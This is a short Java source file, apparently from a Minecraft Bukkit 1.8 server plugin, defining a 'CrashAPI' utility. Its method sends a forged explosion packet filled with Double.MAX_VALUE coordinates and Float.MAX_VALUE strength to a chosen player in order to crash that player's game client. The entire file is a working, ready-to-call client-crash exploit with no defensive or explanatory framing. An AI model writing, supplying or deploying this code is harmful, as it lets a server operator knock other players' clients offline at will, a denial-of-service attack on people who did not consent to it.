package br.com.stenox.cxc.utils;

import java.util.Collections;

import net.minecraft.server.v1_8_R3.*;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;

public class CrashAPI {

	public static void crashPlayer(Player player) {
		try {
			sendPacket(player);
		} catch (Throwable e) {
			e.printStackTrace();
		}
	}

	private static void sendPacket(Player player) {
		try {
			EntityPlayer entityPlayer = ((CraftPlayer) player).getHandle();
			PlayerConnection connection = entityPlayer.playerConnection;

			Vec3D vec3D = new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE);
			PacketPlayOutExplosion packet = new PacketPlayOutExplosion(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Collections.emptyList(), vec3D);

			connection.sendPacket(packet);
		} catch (Throwable e) {
			e.printStackTrace();
		}
	}
}